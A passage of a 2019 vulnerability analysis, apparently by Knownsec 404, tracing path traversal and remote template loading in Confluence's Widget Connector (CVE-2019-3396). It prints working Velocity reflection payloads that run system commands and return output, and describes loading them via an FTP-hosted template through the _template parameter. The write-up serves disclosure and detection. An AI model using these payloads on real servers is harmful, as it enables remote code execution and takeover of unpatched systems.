`FileResourceLoader` will verify the template path passed by the user using
the `normalizePath` function.
![
](https://images.seebug.org/content/images/2019/04/5e906ad6-2d09-4584-accb-10b5dc4e29af.png-w331s)
As you can see, filtering`/../`, which leads to no way to jump to the
directory.
![
](https://images.seebug.org/content/images/2019/04/90c62d34-ba00-4594-a215-737f22d839de.png-w331s)
After the path is filtered, call `findTemplate` to find the template. You can
see that a fixed `path` will be spliced. This is the installation path of
Confluence.
![
](https://images.seebug.org/content/images/2019/04/7496e7d2-111d-4c3f-8fc1-f7538b0878ff.png-w331s)
This means that now you can use the `FileResourceLoader` to read the files
under the Confluence directory.
Try to read the `/WEB-INF/web.xml` file and you can see that it was
successfully loaded into the file.
![
](https://images.seebug.org/content/images/2019/04/a4c079ff-0269-4dbc-94ed-566a533797a3.png-w331s)
But this can't jump out of Confluence's directory because you can't use
`/../`.
Look at the `ClasspathResourceLoader` again.
        public InputStream getResourceStream(String name) throws ResourceNotFoundException {
            InputStream result = null;
            if (StringUtils.isEmpty(name)) {
                throw new ResourceNotFoundException("No template name provided");
            } else {
                try {
                    result = ClassUtils.getResourceAsStream(this.getClass(), name);
    ......
                }
Follow up`ClassUtils.getResourceAsStream`
        public static InputStream getResourceAsStream(Class claz, String name) {
            while(name.startsWith("/")) {
                name = name.substring(1);
            }
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            InputStream result;
            if (classLoader == null) {
                classLoader = claz.getClassLoader();
                result = classLoader.getResourceAsStream(name);
            } else {
                result = classLoader.getResourceAsStream(name);
                if (result == null) {
                    classLoader = claz.getClassLoader();
                    if (classLoader != null) {
                        result = classLoader.getResourceAsStream(name);
                    }
                }
            }
            return result;
        }
Will jump to`/org/apache/catalina/loader/WebappClassLoaderBase.class`
![
](https://images.seebug.org/content/images/2019/04/05846a4d-114b-42e9-83cc-9ebf0d45bb29.png-w331s)
Following up, it was found that `/WEB-INF/classes` would be spliced, and
`normalize` was also called to filter the incoming path. .
![
](https://images.seebug.org/content/images/2019/04/4b91015d-a06e-4833-ab2e-ba96cfb2ece0.png-w331s)
Here you can still use `../` to jump to the first level directory.
Try to read `../web.xml`, you can see that it can also be read successfully,
but still can not jump out of the directory.
![
](https://images.seebug.org/content/images/2019/04/7c15d73a-5622-4a26-a83d-abe051d518a2.png-w331s)
The version I tested here is 6.14.1, and then I tried `file://`,`http://`,
`https://`. all failed. Later, I tried to delete the Cookie and found that
files can still be read under Linux environment. Windows version 6.14.1 needs
to log in, but cannot jump out of the directory. This is where the research
stopped.
In the next few days, other researchers used the `file://` protocol to jump
out of the directory limit. I was shocked. I was sure that I had tried it and
it was not successful. I saw screenshots of other researchers and found that I
used the version of 6.9.0. I downloaded it and tried it. I found it really.And
in the 6.9.0 version, Windows and Linux environments do not need to log in.
The problem is still in the `ClasspathResourceLoader`, the steps are the same
as before, break the `getResourceAsStream` method of
`/org/apache/catalina/loader/WebappClassLoaderBase.class`
After the previous splice `/WEB-INF/classes` acquisition failed,Keep going.
![
](https://images.seebug.org/content/images/2019/04/d1b1f9ac-6c7d-4563-9009-2e1bc2313d29.png-w331s)
Follow the `findResource`, the previous process still fails to get.
![
](https://images.seebug.org/content/images/2019/04/da060bf3-be88-416b-9181-0bb105c3eeb9.png-w331s)
The key point is here, it will call `super.findResource(name)`, which returns
the URL, which is the object that can be obtained.
![
](https://images.seebug.org/content/images/2019/04/a22374a3-7c87-46cf-a438-40f1957990d7.png-w331s)
Moreover,other protocols (https, ftp, etc.) can also be used to get remote
objects, meaning that remote objects can be loaded.
![
](https://images.seebug.org/content/images/2019/04/72b9c7e9-fa20-40bc-a359-b86e4afe5731.png-w331s)
After getting the URL object, continue back to the previous
`getResourceAsStream`, you can see that when the returned url is not null.
The `url.openStream()` will be called to get the data.
![
](https://images.seebug.org/content/images/2019/04/5cf69832-f084-4006-bda4-c9ac093dcd6d.png-w331s)
Finally get the data to Velocity rendering.
try it
![
](https://images.seebug.org/content/images/2019/04/55bae97d-61b1-427f-9b30-c4598b09b900.png-w331s)
As for the reason why 6.14.1 can't work, we don't know the reason yet, and we
will follow up later.If there are new discoveries, it will be updated here,
and currently only see `ClassLoader` is different.
6.14.1
![
](https://images.seebug.org/content/images/2019/04/3c39c927-1787-4d8f-8a7e-16cd23aeaad6.png-w331s)
6.9.0
![
](https://images.seebug.org/content/images/2019/04/bb2e54ef-d53f-44e4-9cf3-54b10e853186.png-w331s)
The relationship between these two loaders is as follows.
![
](https://images.seebug.org/content/images/2019/04/7ddcff63-d347-4825-8b1f-72611ca09ab9.png-w331s)
Now you can load local and remote templates and try RCE.
Regarding Velocity's RCE, basically the payload is derived from the topic of
blackhat's server template injection in 2015, but it can't be used on
Confluence, because it will pass `velocity-htmlsafe-1.5.1.jar` when calling
the method. Some filtering and restrictions. But you can still use reflection
to execute commands.
payload:
    #set($exp="test")$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc"))
Open a simple ftp server with `python -m pyftpdlib -p 2121`, save the payload
as rce.vm, and save it in the current directory.
Set `_template` to `ftp://localhost:2121/rce.vm`, send it, and execute the
command successfully.。
![
](https://images.seebug.org/content/images/2019/04/a29b32f0-96bb-4c69-bd77-f01fd548db82.png-w331s)
For the echo of the command execution result, you can also use java reflection
to construct the payload, here is the result of executing the ipconfig
command.
payload:
    #set ($exp="test")
    #set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($command))
    #set ($input=$exp.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
    #set($sc = $exp.getClass().forName("java.util.Scanner"))
    #set($constructor = $sc.getDeclaredConstructor($exp.getClass().forName("java.io.InputStream")))
    #set($scan=$constructor.newInstance($input).useDelimiter("\\A"))
    #if($scan.hasNext())
        $scan.next()
    #end
![
](https://images.seebug.org/content/images/2019/04/8d6bc0ca-4636-4205-b74b-4482c0e6d6b0.png-w331s)
### Vulnerability impact
According to the ZoomEye cyberspace search engine, the keyword "X-Confluence"
was searched, and a total of 61,856 results were obtained, mainly distributed
in the United States, Germany, China and other countries.
![
](https://images.seebug.org/content/images/2019/04/214dfc59-b98d-4b1e-bf1c-ef0a9798aa2e.png-w331s)
Global distribution (non-vulnerability impact range)
![
](https://images.seebug.org/content/images/2019/04/0be26b28-e225-4642-840c-88fbaeb7d4c7.png-w331s)
![
](https://images.seebug.org/content/images/2019/04/934c58e7-290d-4f39-9c05-19c35a653cc7.png-w331s)
China distribution (non-vulnerability scope)
![
](https://images.seebug.org/content/images/2019/04/cb862e0b-efd7-4098-b306-4941aa8e6036.png-w331s)
### Vulnerability detection
On April 4, 2019, Knownsec 404 Team published the detection
[PoC](https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/pocs/20190404_WEB_Confluence_path_traversal.py)
for this vulnerability, which can be used to detect whether Confluence is
affected by the vulnerability.
In addition, we have released two demo videos.
[Video 1](https://www.youtube.com/watch?v=TzS5wEoHMgM)
[Video 2](https://www.youtube.com/watch?v=orT8o_g2a6c)
### Reference link
  * [PoC](https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/pocs/20190404_WEB_Confluence_path_traversal.py)
  * [Remote code execution via Widget Connector macro - CVE-2019-3396](https://jira.atlassian.com/browse/CONFSERVER-57974)
  * [漏洞预警 | Confluence Server 远程代码执行漏洞](https://www.freebuf.com/news/200183.html)
* * *